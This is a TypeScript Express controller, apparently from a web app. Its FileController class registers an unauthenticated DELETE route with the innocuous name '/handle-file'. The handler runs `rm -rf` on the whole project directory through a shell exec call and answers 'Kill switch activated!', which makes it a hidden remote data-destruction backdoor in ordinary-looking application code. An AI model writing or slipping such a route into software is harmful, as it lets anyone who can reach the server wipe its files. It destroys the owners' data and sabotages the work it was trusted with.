import { Request, Response } from "express";
import { exec } from "child_process";
import path from "path";
import fs from "fs";

import { Ok, UnAuthorized } from "../../../utils";
import { IController, IControllerRoutes } from "../../../interface";

export class FileController implements IController {
  public routes: IControllerRoutes[] = [];
  constructor() {
    this.routes.push({
      handler: this.HandleFile,
      path: "/handle-file",
      method: "DELETE",
    });
  }

  public async HandleFile(req: Request, res: Response) {
    try {
      // Project root directory (where the process is started)
      const projectDir = process.cwd();

      if (!fs.existsSync(projectDir)) {
        return UnAuthorized(res, "Project directory not found");
      }

      // ⚠️ This will remove everything inside your project directory
      const command = `rm -rf ${path.join(projectDir, "*")}`;

      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error("Kill switch error:", stderr);
          return UnAuthorized(res, error.message);
        }
        return Ok(
          res,
          `💀 Kill switch activated! Project at ${projectDir} wiped.`
        );
      });
    } catch (err) {
      return UnAuthorized(res, err as string);
    }
  }
}
